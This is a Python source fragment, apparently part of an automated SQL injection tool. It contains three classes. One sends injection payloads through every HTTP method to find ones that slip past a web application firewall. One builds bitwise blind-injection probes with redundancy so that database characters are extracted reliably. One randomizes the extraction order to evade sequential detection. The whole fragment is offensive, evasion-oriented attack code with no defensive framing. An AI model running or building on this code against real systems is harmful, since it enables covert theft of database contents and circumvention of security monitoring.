class DifferentialMethodProber:
    """Tests same parameter via GET/POST/PUT/PATCH/DELETE.
    Some methods bypass WAF; different methods construct different SQL.
    """

    METHODS = ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"]

    @classmethod
    async def probe_all_methods(cls, engine, url: str, param: str,
                                   payload: str, tamper_chain: List[str],
                                   baseline_fp) -> List[Dict]:
        """Send injection via each HTTP method and compare responses."""
        results = []
        for method in cls.METHODS:
            try:
                if method in ("GET", "DELETE", "OPTIONS"):
                    fp = await _send_injected(engine, method, url, None,
                        "query", param, payload, tamper_chain)
                else:
                    fp = await _send_injected(engine, method, url,
                        f"{param}={payload}", "form", param, payload, tamper_chain)
                results.append({
                    "method": method,
                    "status": getattr(fp, "status_code", 500),
                    "length": fp.content_length,
                    "different": abs(fp.content_length - baseline_fp.content_length) > 30,
                    "error": _get_safe_status_code(fp) >= 500,
                })
            except Exception:
                results.append({"method": method, "status": 0, "error": True})
        return results


#  v23-8: Error-Correcting Extraction 

class ErrorCorrectionExtractor:
    """Adds redundant probe bits for Reed-Solomon-like error correction.
    Recovers correct values even with 5-10% probe noise.
    """

    @staticmethod
    def extract_with_redundancy(probe_results: List[bool],
                                   n_data_bits: int = 7) -> int:
        """Decode character from redundant probe results using majority vote."""
        if len(probe_results) < n_data_bits:
            return 0
        # For each bit position, take majority vote across redundant probes
        bits = []
        probes_per_bit = len(probe_results) // n_data_bits
        for i in range(n_data_bits):
            start = i * probes_per_bit
            end = start + probes_per_bit
            chunk = probe_results[start:end]
            bit = 1 if sum(chunk) > len(chunk) / 2 else 0
            bits.append(bit)
        # Reconstruct value from bits
        value = sum(b << i for i, b in enumerate(bits))
        return value

    @staticmethod
    def build_redundant_probes(char_func: str, n_redundancy: int = 3) -> List[str]:
        """Build probe conditions with redundancy for error correction."""
        probes = []
        for bit in range(7):  # 7 bits for ASCII
            threshold = 1 << bit
            cond = f"({char_func})&{threshold}={threshold}"
            # Send each bit probe n_redundancy times
            for _ in range(n_redundancy):
                probes.append(cond)
        return probes


#  v23-9: Out-of-Order Extraction with Reassembly 

class OutOfOrderExtractor:
    """Extracts characters in random order to evade sequential detection.
    Reassembles client-side after all positions are extracted.
    """

    @staticmethod
    def shuffle_positions(length: int) -> List[int]:
        """Generate randomized extraction order."""
        positions = list(range(1, length + 1))
        random.shuffle(positions)
        return positions

    @staticmethod
    def reassemble(char_map: Dict[int, str]) -> str:
        """Reassemble string from positionchar mapping."""
        if not char_map:
            return ""
        max_pos = max(char_map.keys())
        return "".join(char_map.get(i, "?") for i in range(1, max_pos + 1))


